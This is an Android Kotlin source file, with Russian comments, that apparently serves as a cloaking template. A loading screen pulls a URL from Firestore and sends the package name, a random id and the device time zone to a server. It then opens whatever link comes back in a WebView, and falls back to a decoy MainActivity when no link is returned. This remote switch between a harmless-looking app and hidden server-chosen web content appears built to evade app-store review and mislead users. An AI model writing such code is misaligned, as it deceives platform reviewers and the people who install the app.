package com.template

import android.Manifest
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.template.Constants.EMPTY
import com.template.Constants.TEST
import com.template.network.NetworkManager
import com.template.storage.AppPreferences
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.jsoup.Jsoup
import java.util.TimeZone
import java.util.UUID


class LoadingActivity : AppCompatActivity() {

    private lateinit var token: String
    private lateinit var analytics: FirebaseAnalytics
    private lateinit var BASE_URL: String
    private lateinit var singlePermissionPostNotifications: ActivityResultLauncher<String>
    var appPreferences: AppPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        analytics = Firebase.analytics
        appPreferences = AppPreferences(this)

        if (NetworkManager.isNetworkAvailable(this)) {
            doLog("сеть есть")
            if (appPreferences?.getFirestoreState() == EMPTY) {
                doLog("firestore empty, уже открывался и он пустой -> открываем MainActivity")
                openMainActivity()
            } else { // делаем это если firestorestate EXIST или null
                doLog("firestore уже содержит ссылку или null")
                if (appPreferences?.getLink() != null) {
                    doLog("имеется уже ссылка, открываем веб вью")
                    openWebActivity(appPreferences?.getLink()!!)
                } else {
                    doLog("ссылка содержит null, firestore впервые открываем для получения ссылки")
                    initFirebase()
                    getDataFromFirestore()
                    initRegisterForActivityResult()
                    getPermission()
                }
            }
        } else {
            doLog("сети нет")
            if (appPreferences?.getLink() != null) {
                doLog("ссылка сохранена в памяти, открываем веб вью")
                openWebActivity(appPreferences?.getLink()!!)
            } else {
                doLog("ссылки нет в памяти, открываем мэйн активити")
                openMainActivity()
            }
        }
    }

    private fun doLog(s: String) {
        Log.d(TEST, s)
    }

    private fun initFirebase() {
        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                return@addOnCompleteListener
            }
            token = task.result
        }
    }

    private fun getDataFromFirestore() {
        val db = Firebase.firestore
        val docData = db.collection("database").document("check")

        docData.get()
            .addOnSuccessListener { document ->
                if (document != null) {
                    doLog("данные из firestore: ${document.data}")
                    BASE_URL = document.data?.get("link").toString()
                    appPreferences?.setFirestoreState(Constants.EXIST)
                    doLog("установили firestore state exist")
                    getRequest(BASE_URL)
                } else {
                    doLog("документ в fierstore не найден")
                    appPreferences?.setFirestoreState(EMPTY)
                    doLog("установили firestore state empty")
                    openMainActivity()
                }
            }
            .addOnFailureListener { exception ->
                Log.d(TEST, "не получилось получить ответ от firestore", exception)
                appPreferences?.setFirestoreState(EMPTY)
                doLog("установили firestore state empty")
                openMainActivity()
            }

    }

    private fun getRequest(url: String) {
        val userId = UUID.randomUUID().toString()
        val tz = TimeZone.getDefault().id // работает только на физическом устройстве
        // val tz = "Europe/Moscow" // для проверки на виртуальном уст-ве
        doLog("timeZone: $tz")
        val link =
            "$url/?packageid=$packageName&usserid=$userId&getz=$tz&getr=utm_source=google-play&utm_medium=organic"
        doLog("наша итоговая ссылка к серверу: $link")
        makeRequest(link)

    }

    private fun makeRequest(link: String) {
        GlobalScope.launch {
            try {
                val document = Jsoup
                    .connect(link)
                    .ignoreContentType(true)
                    .get()

                val text = document.text().toString()
                doLog("Answer from server: $text")

                appPreferences?.setFirestoreState(Constants.EXIST)
                doLog("установили firestore state exist (получили ссылку)")
                appPreferences?.setLink(text)
                openWebActivity(text)
            } catch (Ex: Exception) {
                doLog(Ex.localizedMessage as String)
                appPreferences?.setFirestoreState(EMPTY)
                doLog("установили firestore state empty (получили error)")
                openMainActivity()
            }
        }

    }

    private fun openMainActivity() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    private fun openWebActivity(link: String) {
        val intent = Intent(this, WebActivity::class.java)
        intent.putExtra(Constants.LINK, link)
        startActivity(intent)
        finish()
    }

    private fun getPermission() {
        if (Build.VERSION.SDK_INT >= 33) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS)) {
                singlePermissionPostNotifications.launch(Manifest.permission.POST_NOTIFICATIONS)
            } else {
                singlePermissionPostNotifications.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    private fun initRegisterForActivityResult() {
        singlePermissionPostNotifications =
            registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    when {
                        granted -> {
                            // уведомления разрешены
                        }

                        !shouldShowRequestPermissionRationale(Manifest.permission.POST_NOTIFICATIONS) -> {
                            // пользователь нажал "больше не показывать"
                        }

                        else -> {
                            // уведомления запрещены, пользователь отклонил запрос
                        }
                    }
                }
            }
    }
}
